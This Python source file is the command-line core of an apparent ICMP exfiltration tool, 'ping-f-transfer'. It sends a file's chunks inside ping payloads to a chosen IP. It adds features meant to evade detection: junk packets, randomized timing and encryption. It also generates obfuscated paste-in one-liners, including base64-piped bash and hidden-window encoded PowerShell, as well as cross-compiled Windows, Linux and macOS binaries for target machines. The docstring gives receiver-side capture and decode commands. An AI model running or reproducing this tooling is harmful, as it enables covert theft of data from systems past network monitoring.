#!/usr/bin/env python3
"""
*Example Usage*
# Transfer file using 'ping' to a target IP (run it on machine that contains the desired file to transfer)
ping-f-transfer transfer -f FILE -i IP [-p PERIOD] [-r RANDOM_DELAY]
# Generate a payload that can be copy/pasted to transfer file using 'ping'
ping-f-transfer generate -f FILE -i IP -l LANGUAGE [-p PERIOD] [-r RANDOM_DELAY]
# Generate a standalone script file that can be transferred and executed on the target machine
ping-f-transfer makefile -f FILE -i IP -l LANGUAGE [-o OUTPUT_FILE] [-p PERIOD] [-r RANDOM_DELAY]

-> In machine that receives file:
# Capture packets and save them into file
sudo tshark -i eth0 -l -Y 'icmp.type==8 && ip.src==<IP-Sending-File>' -T fields -e data.data > capture.hex
# Decode packets from hex into the corresponding original file format
LC_ALL=C sort -u capture.hex | cut -c7- | xxd -r -p > test_new.txt
# If --junk was used, filter junk packets before decoding
LC_ALL=C sort -u capture.hex | grep -v '^ffffff' | cut -c7- | xxd -r -p > test_new.txt
# If --junk --randomize-junk was used
LC_ALL=C sort -u capture.hex | grep -v '^ff' | cut -c7- | xxd -r -p > test_new.txt
# If --compress was used, decompress after decoding (combine with grep if --junk was also used)
LC_ALL=C sort -u capture.hex | cut -c7- | xxd -r -p | gunzip > test_new.txt
# If --encrypt was used, decrypt after decoding (combine with grep/gunzip as needed)
LC_ALL=C sort -u capture.hex | cut -c7- | xxd -r -p | openssl enc -d -aes-256-cbc -pbkdf2 -iter 10000 -md sha256 -pass pass:YOUR_PASSPHRASE > test_new.txt
# If --encrypt and --compress were both used (decrypt first, then decompress)
LC_ALL=C sort -u capture.hex | cut -c7- | xxd -r -p | openssl enc -d -aes-256-cbc -pbkdf2 -iter 10000 -md sha256 -pass pass:YOUR_PASSPHRASE | gunzip > test_new.txt
# Check the SHA-256 hash from decoded file and compare it with hash shown by the script
sha256sum test_new.txt
"""

import argparse
import base64
import gzip
import hashlib
import os
import random
import subprocess
import sys
import time

from .constants import CHUNK, INDEX_BYTES, RETRIES, TIMEOUT, CIPHERS, color, STAR, STAR_v2, WARNING_STR
from .banner import print_banner
from .helpers import ping, format_time, _resolve_passphrase, _print_capture_instructions
from .payloads import (
    _python_payload, _powershell_payload, _bash_payload,
    _perl_payload, _ruby_payload, _php_payload, _node_payload,
    _go_payload, _c_payload,
)


def add_common_args(parser):
    parser.add_argument("-f", "--file", required=True, help="File to send")
    parser.add_argument("-i", "--ip", required=True, metavar="IP",
                        help="Address of the machine receiving the file")
    parser.add_argument("-p", "--period", type=float, default=0.0,
                        help="Seconds from one ping to the next (default: 0 secs, send as soon as each reply arrives)")
    parser.add_argument("-r", "--random-delay", type=float, default=0.0,
                        help="Random variation in seconds added to --period, so each gap is period +/- this value "
                             "(default: 0 secs, no variation)")
    parser.add_argument("--no-banner", action="store_true", help="Do not print the banner")
    parser.add_argument("--junk", type=int, default=0, metavar="N",
                        help="Send N junk ICMP packets after each real packet (default: 0, disabled)")
    parser.add_argument("--randomize-junk", action="store_true",
                        help="Randomize junk packet indices (first byte 0xFF, rest random); requires --junk")
    parser.add_argument("--compress", action="store_true",
                        help="Gzip-compress the file before sending; receiver must decompress with gunzip")
    parser.add_argument("--encrypt", nargs='?', const='aes-256-cbc', default=None,
                        metavar="CIPHER",
                        help="Encrypt with passphrase (default: aes-256-cbc). Supported: aes-128, aes-192, aes-256")
    parser.add_argument("--estimate-transfer-time", action="store_true",
                        help="Show transfer stats without actually sending any packets")
    parser.add_argument("--enc-passphrase", default=None, metavar="PASS",
                        help="Passphrase for --encrypt (avoids interactive prompt)")
    parser.add_argument("--random-passphrase", type=int, nargs='?', const=16, default=None, metavar="LEN",
                        help="Generate a random passphrase of LEN characters (default: 16); requires --encrypt")
    parser.add_argument("--capture-packets-filename", default="capture.hex", metavar="NAME",
                        help="Filename shown in the tshark/decode instructions (purely informative, default: capture.hex)")
    parser.add_argument("--decoded-filename", default="output_file", metavar="NAME",
                        help="Filename shown in the decode output instructions (purely informative, default: output_file)")


def parse_args():
    parser = argparse.ArgumentParser(description="Send a file with ping, one echo request per chunk.")
    subparsers = parser.add_subparsers(dest="command", required=True)

    transfer_p = subparsers.add_parser("transfer", help="Transfer a file using ping")
    add_common_args(transfer_p)

    generate_p = subparsers.add_parser("generate", help="Generate a oneliner for the target machine")
    add_common_args(generate_p)
    generate_p.add_argument("-l", "--language", required=True, choices=["python", "powershell", "bash", "perl", "ruby", "php", "node", "javascript"],
                            help="Language of the generated oneliner")
    generate_p.add_argument("--randomize-var", action="store_true",
                            help="Randomize variable names in the generated payload")
    generate_p.add_argument("--split-payload", type=int, nargs='?', const=2, default=0, metavar="N",
                            help="Split the encoded payload into N paste-friendly chunks (2-10, default: 2)")
    generate_p.add_argument("--obfuscate-strings", action="store_true",
                            help="XOR-encode sensitive strings (file path, IP, passphrase) in the generated payload")

    makefile_p = subparsers.add_parser("makefile", help="Generate a standalone script file for the target machine")
    add_common_args(makefile_p)
    makefile_p.add_argument("-l", "--language", required=True, choices=["python", "powershell", "bash", "perl", "ruby", "php", "node", "javascript", "go", "c"],
                            help="Language of the generated file")
    makefile_p.add_argument("-o", "--output-file", default=None, metavar="FILE",
                            help="Output file path (default: generated_ping_f_transfer.<ext>)")
    makefile_p.add_argument("--randomize-var", action="store_true",
                            help="Randomize variable names in the generated payload")
    makefile_p.add_argument("--create-script-for", choices=["linux", "macos", "windows"],
                            help="Target OS for Go/C cross-compilation (required when -l go or -l c)")
    makefile_p.add_argument("--obfuscate-strings", action="store_true",
                            help="XOR-encode sensitive strings (file path, IP, passphrase) in the generated payload")

    args = parser.parse_args()
    if args.period < 0:
        parser.error("--period must not be negative")
    if args.random_delay < 0:
        parser.error("--random-delay must not be negative")
    if args.junk < 0:
        parser.error("--junk must not be negative")
    if args.randomize_junk and not args.junk:
        parser.error("--randomize-junk requires --junk")
    if hasattr(args, 'split_payload') and args.split_payload and not 2 <= args.split_payload <= 10:
        parser.error("--split-payload must be between 2 and 10")
    if args.encrypt is not None:
        if args.encrypt not in CIPHERS:
            parser.error(f"--encrypt: unsupported cipher '{args.encrypt}'. Supported: aes-128, aes-192, aes-256")
        args.encrypt = CIPHERS[args.encrypt][0]
    if args.enc_passphrase is not None and args.encrypt is None:
        parser.error("--enc-passphrase requires --encrypt")
    if args.random_passphrase is not None and args.encrypt is None:
        parser.error("--random-passphrase requires --encrypt")
    if args.enc_passphrase is not None and args.random_passphrase is not None:
        parser.error("--enc-passphrase and --random-passphrase are mutually exclusive")
    if args.random_passphrase is not None and args.random_passphrase < 1:
        parser.error("--random-passphrase must be at least 1")
    if hasattr(args, 'create_script_for'):
        if args.language in ('go', 'c') and not args.create_script_for:
            parser.error(f"--create-script-for is required when language is '{args.language}'")
        if args.language not in ('go', 'c') and args.create_script_for:
            parser.error("--create-script-for is only valid when language is 'go' or 'c'")
    return args


def cmd_transfer(args):
    path, target = args.file, args.ip
    try:
        with open(path, "rb") as f:
            data = f.read()
    except Exception as e:
        print(f"{WARNING_STR}{color['RED']} An error ocurred while attempting to open file {color['MAGENTA']}{args.file}{color['RED']}:\n"
              f"{color['YELLOW']}{e}{color['RED']}\n\n{color['NC']}")
        sys.exit(1)
    file_hash = hashlib.sha256(data).hexdigest()
    if args.compress:
        original_size = len(data)
        data = gzip.compress(data)
        print(f"{STAR} {color['GREEN']}Compressed: {color['BLUE']}{original_size}{color['GREEN']} -> {color['BLUE']}{len(data)}{color['GREEN']} bytes "
              f"({color['BLUE']}{100 * len(data) / original_size:.1f}%{color['GREEN']}){color['NC']}")
    if args.encrypt:
        passphrase = _resolve_passphrase(args, confirm=True)
        proc = subprocess.run(
            ['openssl', 'enc', f'-{args.encrypt}', '-pbkdf2', '-iter', '10000', '-md', 'sha256',
             '-pass', f'pass:{passphrase}'],
            input=data, capture_output=True
        )
        if proc.returncode != 0:
            sys.exit(f"{WARNING_STR} {color['RED']}Encryption failed: {proc.stderr.decode().strip()}{color['NC']}")
        data = proc.stdout
        print(f"{STAR} {color['GREEN']}Encrypted with {color['BLUE']}{args.encrypt}{color['NC']}")
    total = (len(data) + CHUNK - 1) // CHUNK
    if total > (1 << (8 * INDEX_BYTES)) - (0x10000 if args.randomize_junk else (1 if args.junk else 0)):
        sys.exit(f"{WARNING_STR} {color['RED']}File too large for the 3-byte chunk index{color['NC']}")
    if args.random_delay != 0.0:
        print(f"{STAR_v2} {color['GREEN']}Sending {color['BLUE']}{path}{color['GREEN']} ({len(data)} bytes) to {color['MAGENTA']}{target}{color['GREEN']} in {color['BLUE']}{total} pings{color['GREEN']} "
              f"every {color['BLUE']}({args.period} +- {args.random_delay}) s{color['NC']}\n")
    elif args.period != 0.0:
        print(f"{STAR_v2} {color['GREEN']}{color['GREEN']}Sending {color['BLUE']}{path}{color['GREEN']} ({len(data)} bytes) to {color['MAGENTA']}{target}{color['GREEN']} in {color['BLUE']}{total} pings {color['GREEN']}every {color['BLUE']}{args.period}{color['GREEN']} s")
    else:
        print(f"{STAR_v2} {color['GREEN']}Sending {color['BLUE']}{path} {color['GREEN']}({len(data)} bytes) to {color['MAGENTA']}{target}{color['GREEN']} in {color['BLUE']}{total} pings")
    if args.random_delay > args.period:
        print(f"{WARNING_STR} {color['RED']}WARNING: --random-delay ({args.random_delay} s) is bigger than --period ({args.period} s), "
              f"so some gaps between pings will be 0 s (sent immediately){color['NC']}", file=sys.stderr)
    if args.junk:
        junk_msg = f"{STAR} {color['GREEN']}Sending {color['BLUE']}{args.junk}{color['GREEN']} junk packet{'s' if args.junk != 1 else ''} after each real packet"
        if args.randomize_junk:
            junk_msg += f" {color['YELLOW']}(randomized indices){color['GREEN']}"
        print(junk_msg + color['NC'])
    if args.estimate_transfer_time:
        print(f"\n{WARNING_STR} {color['RED']}ESTIMATE OPTION ENABLED — the file will NOT be transferred{color['NC']}\n")
        total_pings = total * (1 + args.junk)
        print(f"{STAR} {color['GREEN']}File size (after processing): {color['BLUE']}{len(data)}{color['GREEN']} bytes{color['NC']}")
        print(f"{STAR} {color['GREEN']}Data pings: {color['BLUE']}{total}{color['NC']}")
        if args.junk:
            print(f"{STAR} {color['GREEN']}Junk pings: {color['BLUE']}{total * args.junk}{color['NC']}")
        print(f"{STAR} {color['GREEN']}Total pings: {color['BLUE']}{total_pings}{color['NC']}")
        if args.period > 0:
            est = total_pings * args.period
            print(f"{STAR} {color['GREEN']}Estimated time: {color['BLUE']}~{format_time(est)}{color['NC']}")
        print(f"\n{STAR} {color['GREEN']}SHA-256 hash: {color['CYAN']}{file_hash}{color['NC']}")
        return
    last_sent = None
    start = time.monotonic()
    print()
    for index in range(total):
        payload = index.to_bytes(INDEX_BYTES, "big") + data[index * CHUNK:(index + 1) * CHUNK]
        for _ in range(RETRIES):
            if last_sent is not None:
                gap = args.period + random.uniform(-args.random_delay, args.random_delay)
                time.sleep(max(0.0, last_sent + gap - time.monotonic()))
            last_sent = time.monotonic()
            if ping(target, payload):
                break
        else:
            sys.exit(f"{WARNING_STR} {color['RED']}No reply for ping {color['YELLOW']}{index}{color['RED']}, transfer aborted{color['NC']}")
        sent = index + 1
        if args.junk:
            for _ in range(args.junk):
                if args.randomize_junk:
                    junk_payload = b'\xff' + os.urandom(INDEX_BYTES - 1 + CHUNK)
                else:
                    junk_payload = b'\xff' * INDEX_BYTES + os.urandom(CHUNK)
                if last_sent is not None:
                    gap = args.period + random.uniform(-args.random_delay, args.random_delay)
                    time.sleep(max(0.0, last_sent + gap - time.monotonic()))
                last_sent = time.monotonic()
                ping(target, junk_payload)
        if args.period != 0.0 or args.random_delay != 0.0:
            elapsed = time.monotonic() - start
            status = (f"{color['CYAN']}\r    {sent}/{total} {color['GREEN']}pings, {min(sent * CHUNK, len(data))}/{len(data)} bytes, "
                      f"{100 * sent / total:.1f}%, {color['MAGENTA']}elapsed {format_time(elapsed)}{color['NC']}")
            if args.random_delay == 0.0:
                remaining = elapsed / sent * (total - sent)
                status += f", {color['GREEN']}remaining ~{format_time(remaining)}{color['NC']}"
            print(status, end="", flush=True)
        elif sent % 100 == 0:
            print(f"{color['CYAN']}    {sent}/{total}{color['NC']}")
    print(f"\n\n{color['GRAY']}{'='*50}\n{color['MAGENTA']}{' '*21}DONE\n{color['GRAY']}{'='*50}\n{color['NC']}")
    print(f"{STAR} {color['GREEN']}SHA-256 hash: {color['CYAN']}{file_hash}{color['NC']}")


def cmd_generate(args):
    passphrase = ''
    if args.encrypt:
        passphrase = _resolve_passphrase(args)
    print(f"{STAR} {color['GREEN']}Copy and then paste the following {color['BLUE']}{args.language.capitalize()}{color['GREEN']} payload in terminal:{color['NC']}\n")
    if args.language == "python":
        script = _python_payload(args.file, args.ip, args.period, args.random_delay,
                                 randomize=args.randomize_var, junk=args.junk,
                                 randomize_junk=args.randomize_junk,
                                 compress=args.compress,
                                 encrypt=args.encrypt, passphrase=passphrase,
                                 estimate=args.estimate_transfer_time,
                                 obfuscate_strings=args.obfuscate_strings)
        encoded = base64.b64encode(script.encode()).decode()
        oneliner = "python3 -c \"exec(__import__('base64').b64decode(b'" + encoded + "').decode())\""
        split_cmd = "python3 -c \"exec(__import__('base64').b64decode(b'${x}').decode())\""
        var_assign, var_append = 'x="', 'x+="'
    elif args.language == "powershell":
        script = _powershell_payload(args.file, args.ip, args.period, args.random_delay,
                                     randomize=args.randomize_var, junk=args.junk,
                                     randomize_junk=args.randomize_junk,
                                     compress=args.compress,
                                     encrypt=args.encrypt, passphrase=passphrase,
                                     estimate=args.estimate_transfer_time,
                                 obfuscate_strings=args.obfuscate_strings)
        encoded = base64.b64encode(script.encode("utf-16-le")).decode()
        oneliner = "powershell -NoP -sta -NonI -W Hidden -enc " + encoded
        split_cmd = "powershell -NoP -sta -NonI -W Hidden -enc $x"
        var_assign, var_append = '$x = "', '$x += "'
    elif args.language == "bash":
        script = _bash_payload(args.file, args.ip, args.period, args.random_delay,
                               randomize=args.randomize_var,
                               junk=args.junk, randomize_junk=args.randomize_junk,
                               compress=args.compress,
                               encrypt=args.encrypt, passphrase=passphrase,
                               estimate=args.estimate_transfer_time,
                               obfuscate_strings=args.obfuscate_strings)
        encoded = base64.b64encode(script.encode()).decode()
        oneliner = "echo " + encoded + " | base64 -d | bash"
        split_cmd = "echo $x | base64 -d | bash"
        var_assign, var_append = 'x="', 'x+="'
    elif args.language == "perl":
        script = _perl_payload(args.file, args.ip, args.period, args.random_delay,
                               randomize=args.randomize_var,
                               junk=args.junk, randomize_junk=args.randomize_junk,
                               compress=args.compress,
                               encrypt=args.encrypt, passphrase=passphrase,
                               estimate=args.estimate_transfer_time,
                               obfuscate_strings=args.obfuscate_strings)
        encoded = base64.b64encode(script.encode()).decode()
        oneliner = "echo " + encoded + " | base64 -d | perl"
        split_cmd = "echo $x | base64 -d | perl"
        var_assign, var_append = 'x="', 'x+="'
    elif args.language == "ruby":
        script = _ruby_payload(args.file, args.ip, args.period, args.random_delay,
                               randomize=args.randomize_var,
                               junk=args.junk, randomize_junk=args.randomize_junk,
                               compress=args.compress,
                               encrypt=args.encrypt, passphrase=passphrase,
                               estimate=args.estimate_transfer_time,
                               obfuscate_strings=args.obfuscate_strings)
        encoded = base64.b64encode(script.encode()).decode()
        oneliner = "echo " + encoded + " | base64 -d | ruby"
        split_cmd = "echo $x | base64 -d | ruby"
        var_assign, var_append = 'x="', 'x+="'
    elif args.language == "php":
        script = _php_payload(args.file, args.ip, args.period, args.random_delay,
                               randomize=args.randomize_var,
                               junk=args.junk, randomize_junk=args.randomize_junk,
                               compress=args.compress,
                               encrypt=args.encrypt, passphrase=passphrase,
                               estimate=args.estimate_transfer_time,
                               obfuscate_strings=args.obfuscate_strings)
        encoded = base64.b64encode(script.encode()).decode()
        oneliner = "echo " + encoded + " | base64 -d | php"
        split_cmd = "echo $x | base64 -d | php"
        var_assign, var_append = 'x="', 'x+="'
    elif args.language in ("node", "javascript"):
        script = _node_payload(args.file, args.ip, args.period, args.random_delay,
                               randomize=args.randomize_var,
                               junk=args.junk, randomize_junk=args.randomize_junk,
                               compress=args.compress,
                               encrypt=args.encrypt, passphrase=passphrase,
                               estimate=args.estimate_transfer_time,
                               obfuscate_strings=args.obfuscate_strings)
        encoded = base64.b64encode(script.encode()).decode()
        oneliner = "echo " + encoded + " | base64 -d | node"
        split_cmd = "echo $x | base64 -d | node"
        var_assign, var_append = 'x="', 'x+="'
    if args.split_payload:
        parts = args.split_payload
        chunk_size = len(encoded) // parts
        remainder = len(encoded) % parts
        pos = 0
        for idx in range(parts):
            size = chunk_size + (1 if idx < remainder else 0)
            chunk = encoded[pos:pos + size]
            if parts == 2:
                label = "First half" if idx == 0 else "Second half"
            else:
                label = f"Part {idx + 1}/{parts}"
            print(color['GRAY'] + f'# {label} of the payload' + color['NC'])
            prefix = var_assign if idx == 0 else var_append
            print(color['MAGENTA'] + prefix + chunk + '"' + color['NC'])
            pos += size
        print(color['GRAY'] + f'# {args.language.capitalize()} command to send after storing code in variable' + color['NC'])
        print(color['MAGENTA'] + split_cmd + color['NC'])
    else:
        print(color['MAGENTA'] + oneliner + color['NC'])
    _print_capture_instructions(args, passphrase)


def cmd_makefile(args):
    passphrase = ''
    if args.encrypt:
        passphrase = _resolve_passphrase(args)

    lang_ext = {
        'python': '.py', 'powershell': '.ps1', 'bash': '.sh',
        'perl': '.pl', 'ruby': '.rb', 'php': '.php',
        'node': '.js', 'javascript': '.js', 'go': '.go', 'c': '.c',
    }
    lang_shebang = {
        'python': '#!/usr/bin/env python3\n',
        'bash': '#!/bin/bash\n',
        'perl': '#!/usr/bin/env perl\n',
        'ruby': '#!/usr/bin/env ruby\n',
        'node': '#!/usr/bin/env node\n',
        'javascript': '#!/usr/bin/env node\n',
    }
    lang_run = {
        'python': 'python3', 'powershell': 'pwsh',
        'bash': 'bash', 'perl': 'perl', 'ruby': 'ruby',
        'php': 'php', 'node': 'node', 'javascript': 'node',
    }
    payload_funcs = {
        'python': _python_payload, 'powershell': _powershell_payload,
        'bash': _bash_payload, 'perl': _perl_payload,
        'ruby': _ruby_payload, 'php': _php_payload,
        'node': _node_payload, 'javascript': _node_payload,
    }

    lang = args.language
    if lang == 'go':
        script = _go_payload(args.file, args.ip, args.period, args.random_delay,
                              target_os=args.create_script_for,
                              randomize=args.randomize_var,
                              junk=args.junk, randomize_junk=args.randomize_junk,
                              compress=args.compress,
                              encrypt=args.encrypt, passphrase=passphrase,
                              estimate=args.estimate_transfer_time,
                              obfuscate_strings=args.obfuscate_strings)
    elif lang == 'c':
        script = _c_payload(args.file, args.ip, args.period, args.random_delay,
                             target_os=args.create_script_for,
                             randomize=args.randomize_var,
                             junk=args.junk, randomize_junk=args.randomize_junk,
                             compress=args.compress,
                             encrypt=args.encrypt, passphrase=passphrase,
                             estimate=args.estimate_transfer_time,
                             obfuscate_strings=args.obfuscate_strings)
    else:
        script = payload_funcs[lang](args.file, args.ip, args.period, args.random_delay,
                                     randomize=args.randomize_var,
                                     junk=args.junk, randomize_junk=args.randomize_junk,
                                     compress=args.compress,
                                     encrypt=args.encrypt, passphrase=passphrase,
                                     estimate=args.estimate_transfer_time,
                                 obfuscate_strings=args.obfuscate_strings)

    shebang = lang_shebang.get(lang, '')
    content = shebang + script

    output_path = args.output_file or ('generated_ping_f_transfer' + lang_ext[lang])
    with open(output_path, 'w') as out_f:
        out_f.write(content)

    if shebang:
        os.chmod(output_path, os.stat(output_path).st_mode | 0o111)

    abs_path = os.path.abspath(output_path)
    print(f"{STAR} {color['GREEN']}Generated standalone file: {color['CYAN']}{abs_path}{color['NC']}")
    if lang == 'go':
        target = args.create_script_for
        base = os.path.splitext(os.path.basename(output_path))[0]
        src = os.path.basename(output_path)
        if target == 'linux':
            build = f"go build -o {base} {src}"
            run = f"chmod +x ./{base} && ./{base}"
        elif target == 'macos':
            build = f"GOOS=darwin GOARCH=amd64 go build -o {base} {src}"
            run = f"chmod +x ./{base} && ./{base}"
        else:
            build = f"GOOS=windows GOARCH=amd64 go build -o {base}.exe {src}"
            run = f"{base}.exe"
        print(f"\n{STAR} {color['GREEN']}Build steps (on this Linux machine):{color['NC']}")
        print(f"  {color['CYAN']}1.{color['NC']} {color['RED']}cd {os.path.dirname(abs_path) or '.'}{color['NC']}")
        print(f"  {color['CYAN']}2.{color['NC']} {color['RED']}go mod init ping-f-transfer{color['NC']}")
        print(f"  {color['CYAN']}3.{color['NC']} {color['RED']}{build}{color['NC']}")
        print(f"\n{STAR} {color['GREEN']}Then transfer the executable to the target {target.capitalize()} machine and run:{color['NC']}")
        print(f"  {color['RED']}{run}{color['NC']}")
        _print_capture_instructions(args, passphrase, action_desc="running the compiled executable")
    elif lang == 'c':
        target = args.create_script_for
        base = os.path.splitext(os.path.basename(output_path))[0]
        src = os.path.basename(output_path)
        zflag = " -lz" if args.compress else ""
        if target == 'linux':
            build = f"gcc -o {base} {src} -static -lm{zflag}"
            run = f"chmod +x ./{base} && ./{base}"
        elif target == 'macos':
            build = f"gcc -o {base} {src} -lm{zflag}"
            run = f"chmod +x ./{base} && ./{base}"
        else:
            build = f"x86_64-w64-mingw32-gcc -o {base}.exe {src} -static -lws2_32 -liphlpapi -lm{zflag}"
            run = f"{base}.exe"
        print(f"\n{STAR} {color['GREEN']}Build steps:{color['NC']}")
        print(f"  {color['CYAN']}1.{color['NC']} {color['RED']}cd {os.path.dirname(abs_path) or '.'}{color['NC']}")
        print(f"  {color['CYAN']}2.{color['NC']} {color['RED']}{build}{color['NC']}")
        if target == 'windows' and args.compress:
            print(f"\n{STAR} {color['YELLOW']}Note: cross-compiling for Windows with --compress requires mingw zlib:{color['NC']}")
            print(f"  {color['RED']}sudo apt install libz-mingw-w64-dev{color['NC']}")
        print(f"\n{STAR} {color['GREEN']}Then transfer the executable to the target {target.capitalize()} machine and run:{color['NC']}")
        print(f"  {color['RED']}{run}{color['NC']}")
        _print_capture_instructions(args, passphrase, action_desc="running the compiled executable")
    else:
        run_cmd = lang_run[lang]
        print(f"{STAR} {color['GREEN']}Run with: {color['RED']}{run_cmd} {output_path}{color['NC']}")
        _print_capture_instructions(args, passphrase, action_desc="running the generated file")


def main():
    args = parse_args()
    if not args.no_banner:
        print_banner()
    print()
    if args.command == "transfer":
        cmd_transfer(args)
    elif args.command == "generate":
        cmd_generate(args)
    elif args.command == "makefile":
        cmd_makefile(args)


if __name__ == "__main__":
    main()
